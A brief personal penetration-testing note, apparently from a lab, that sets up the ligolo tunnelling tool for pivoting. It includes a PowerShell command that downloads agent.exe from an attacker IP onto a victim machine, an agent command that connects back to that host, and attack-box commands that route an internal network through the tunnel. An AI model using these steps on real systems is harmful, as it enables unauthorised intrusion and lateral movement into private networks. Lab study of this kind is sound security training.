Had good luck with ligolo in the past lets try again..

```powershell
iwr -uri "http://192.168.45.228:8888/agent.exe" -outfile "C:\Users\Public\Downloads\agent.exe"
```

# ligolo setup

on attack box
```bash
 sudo ip tuntap add user <username> mode tun ligolo

 sudo ip link set ligolo up

 ./poxy -selfcert
```

on victem

``` powershell
.\agent -connect 192.168.45.228:11601 -ignore-cert
```

on attack box

``` bash 
 sudo ip route add <network_address>/<CIDR> dev ligolo
```